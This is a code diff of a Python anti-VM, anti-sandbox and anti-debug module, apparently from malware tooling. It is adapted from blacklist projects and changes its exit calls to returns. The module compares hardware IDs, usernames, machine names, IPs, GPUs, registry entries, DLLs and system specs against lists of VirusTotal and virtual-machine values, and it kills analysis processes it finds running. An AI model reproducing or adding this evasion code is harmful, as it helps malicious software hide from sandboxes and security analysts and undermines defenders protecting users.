@@ -1,12 +1,12 @@
-import winreg
-import os
-import re
-import requests
 import subprocess
-import psutil
-import wmi
 import platform
+import requests
+import winreg
+import psutil
 import uuid
+import wmi
+import re
+import os
 
 
 # Modified script from the original source: https://github.com/6nz/virustotal-vm-blacklist
@@ -17,6 +17,7 @@ def getip_():
     except:
         pass
     return ip
+
 def get_guid_():
     try:
         reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
@@ -24,6 +25,7 @@ def get_guid_():
         return winreg.QueryValueEx(key_value, "MachineGuid")[0]
     except Exception as e:
         print(e)
+
 def get_hwguid_():
     try:
         reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
@@ -33,7 +35,7 @@ def get_hwguid_():
     except Exception as e:
         print(e)
 
-def vt_check():
+def vt_check():  # sourcery skip: low-code-quality
     ip = getip_()
     serveruser = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
@@ -71,78 +73,77 @@ def vt_check():
     hwguid = f'{get_hwguid_()}'.replace('{', ' ').replace('}', ' ')
     try:
         if hwid in hwidlist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
     try:
         if serveruser in pcusernamelist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
     try:
         if pc_name in pcnamelist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
     try:
         if ip in iplist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
     try:
         if mac in maclist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if gpu in gpulist.text:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if current_diskdrive_serial in diskdriveserial_list:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if current_cpu_serial in cpuserial_list:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if current_baseboard_manufacturer in baseboardmanufacturerlist:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if current_bios_serial in bios_serial_list:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if current_baseboard_serial in baseboardserial_list:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if get_guid_() in machineguidlist:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
+        return True
 
     try:
         if hwguid in hwprofileguidlist:
-            os._exit(1)
+            return True
     except:
-        os._exit(1)
-
+        return True
 
 
 # Modified script from the original source: https://github.com/xtekky/Python-Anti-Debug/blob/main/anti-debug.py
@@ -212,7 +213,7 @@ def user_check():
     try:
         USER = os.getlogin()
         if USER in USERS:
-            os._exit(1)
+            return True
     except:
         pass
 
@@ -269,7 +270,7 @@ def name_check():
     try:
         NAME = os.getenv("COMPUTERNAME")
         if NAME in NAMES:
-            os._exit(1)
+            return True
     except:
         pass
 
@@ -277,7 +278,7 @@ def path_check():
     try:
         for path in [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]:
             if os.path.exists(path):
-                os._exit(1)
+                return True
     except:
         pass
 
@@ -290,7 +291,7 @@ def platform_check():
         ]
         PLATFORM = str(platform.version())
         if PLATFORM in PLATFORMS:
-            os._exit(1)
+            return True
     except:
         pass
 
@@ -363,7 +364,7 @@ def ip_check():
         ]
         IP = requests.get("https://api.myip.com").json()["ip"]
         if IP in IPS:
-            os._exit(1)
+            return True
     except:
         pass
 
@@ -375,14 +376,14 @@ def registry_check():
         "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
     )
     if reg1 != 1 and reg2 != 1:
-        os._exit(1)
+        return True
     handle = winreg.OpenKey(
         winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
     )
     try:
         reg_val = winreg.QueryValueEx(handle, "0")[0]
         if ("VMware" or "VBOX") in reg_val:
-            os._exit(1)
+            return True
     finally:
         winreg.CloseKey(handle)
 
@@ -390,20 +391,20 @@ def dll_check():
     vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
     virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
     if os.path.exists(vmware_dll):
-        os._exit(1)
+        return True
     if os.path.exists(virtualbox_dll):
-        os._exit(1)
+        return True
 
 def specs_check():
     try:
         RAM = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
         DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
         if int(RAM) <= 2:
-            os._exit(1)
+            return True
         if int(DISK) <= 50:
-            os._exit(1)
+            return True
         if int(psutil.cpu_count()) <= 1:
-            os._exit(1)
+            return True
     except:
         pass
 
@@ -412,7 +413,7 @@ def proc_check():
     for proc in psutil.process_iter():
         for program in processes:
             if proc.name() == program:
-               os._exit(1)
+               return True
 
 def process_check():
     PROCESSES = [
@@ -454,16 +455,16 @@ def process_check():
             try:
                 proc.kill()
             except (psutil.NoSuchProcess, psutil.AccessDenied):
-                os._exit(1) # <--- Exits if Accesss is Denied to prevent further suspicious inspection (It was originally pass)
+                return True
 
 def check_all():
-    vt_check()
-    user_check()
-    name_check()
-    path_check()
-    platform_check()
-    ip_check()
-    dll_check()
-    specs_check()
-    proc_check()
-    process_check()
+    if vt_check(): return True
+    if user_check(): return True
+    if name_check(): return True
+    if path_check(): return True
+    if platform_check(): return True
+    if ip_check(): return True
+    if dll_check(): return True
+    if specs_check(): return True
+    if proc_check(): return True
+    if process_check(): return True
